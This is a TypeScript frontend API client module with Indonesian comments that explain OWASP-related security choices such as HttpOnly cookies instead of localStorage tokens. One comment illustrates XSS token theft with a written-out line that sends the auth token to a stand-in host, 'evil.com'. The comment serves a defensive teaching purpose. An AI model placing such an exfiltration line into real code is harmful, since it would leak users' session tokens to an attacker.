import axios from 'axios';
import type { LoginResponse, RegisterResponse, ProfileResponse } from '../types/api';

/**
 * =============================================================
 * [OWASP A02 - Security Misconfiguration]
 * 
 * Hanya gunakan environment variable yang diawali VITE_ untuk
 * data PUBLIK yang boleh diakses di browser.
 * 
 * JANGAN simpan secret/credential di frontend env variable!
 * Semua variable VITE_ akan masuk ke JavaScript bundle yang
 * bisa dilihat siapa saja lewat browser DevTools.
 * 
 * Contoh yang TIDAK AMAN:
 * VITE_DB_PASSWORD=rahasia  → masuk ke bundle → bocor! ❌
 * VITE_API_KEY=api_key_123  → masuk ke bundle → bocor! ❌
 * 
 * Catatan: API Key sekarang dikirim HANYA dari backend,
 * bukan dari frontend, untuk keamanan yang lebih baik.
 * =============================================================
 */
const API_URL = import.meta.env.VITE_API_URL;

const apiService = axios.create({
  baseURL: API_URL,
  headers: {
    'Content-Type': 'application/json',
  },
  /**
   * =============================================================
   * [OWASP A04 - Cryptographic Failures]
   * 
   * withCredentials: true memungkinkan browser mengirim HttpOnly
   * cookie secara otomatis pada setiap request cross-origin.
   * 
   * Tanpa ini, cookie autentikasi yang di-set oleh server
   * TIDAK akan dikirim pada request berikutnya, sehingga
   * user akan selalu dianggap belum login.
   * 
   * SEBELUMNYA: Token disimpan di localStorage, lalu 
   *   ditambahkan manual ke header Authorization.
   *   Ini TIDAK AMAN karena localStorage bisa diakses via XSS.
   * 
   * SEKARANG: Cookie HttpOnly dikirim otomatis oleh browser.
   *   Tidak perlu menyimpan/mengirim token secara manual.
   * =============================================================
   */
  withCredentials: true,
});

/**
 * =============================================================
 * [OWASP A04 - Cryptographic Failures]
 * 
 * Interceptor request TIDAK LAGI membaca token dari localStorage.
 * 
 * SEBELUMNYA (TIDAK AMAN):
 * const token = localStorage.getItem('authToken');
 * config.headers.Authorization = `Bearer ${token}`;
 * → Jika ada serangan XSS, attacker bisa mencuri token:
 *   fetch("evil.com", { body: localStorage.getItem('authToken') })
 * 
 * SEKARANG (AMAN):
 * Cookie HttpOnly dikirim otomatis oleh browser.
 * JavaScript TIDAK BISA mengakses cookie ini, sehingga
 * meskipun ada XSS, token tetap aman.
 * =============================================================
 */
apiService.interceptors.request.use(
  (config) => {
    // [A04] Token dikirim otomatis via cookie, tidak perlu manual
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

/**
 * =============================================================
 * [OWASP A09 - Logging & Monitoring Failures]
 * 
 * Response interceptor untuk menangani error secara terpusat.
 * Ini memastikan setiap error dari API dicatat dan ditangani
 * dengan benar, bukan di-ignore secara diam-diam.
 * 
 * Pada production, error ini bisa dikirim ke monitoring service
 * seperti Sentry atau LogRocket.
 * =============================================================
 */
apiService.interceptors.response.use(
  (response) => response,
  (error) => {
    // [A09] Log error yang terjadi (jangan gunakan catch(e){} kosong)
    if (error.response?.status === 401 || error.response?.status === 403) {
      /**
       * [A04] Jika token expired atau tidak valid,
       * redirect ke halaman login.
       */
      if (window.location.pathname !== '/login' && window.location.pathname !== '/register') {
        window.location.href = '/login';
      }
    }
    return Promise.reject(error);
  }
);

export const authAPI = {
  /**
   * Login — server akan mengirim token via HttpOnly cookie,
   * kita tidak perlu menyimpan token secara manual.
   */
  login: async (email: string, kataSandi: string) => {
    return apiService.post<LoginResponse>('/users/login', { email, password: kataSandi });
  },
  register: async (namaPengguna: string, email: string, kataSandi: string) => {
    return apiService.post<RegisterResponse>('/users/register', { name: namaPengguna, email, password: kataSandi });
  },
  getProfile: async () => {
    return apiService.get<ProfileResponse>('/users/profile');
  },
  /**
   * =============================================================
   * [OWASP A04 - Cryptographic Failures]
   * 
   * Endpoint logout untuk menghapus HttpOnly cookie dari server.
   * Cookie HttpOnly tidak bisa dihapus oleh JavaScript,
   * jadi harus ada request ke server untuk menghapusnya.
   * =============================================================
   */
  logout: async () => {
    return apiService.post('/users/logout');
  },
};

export default apiService;
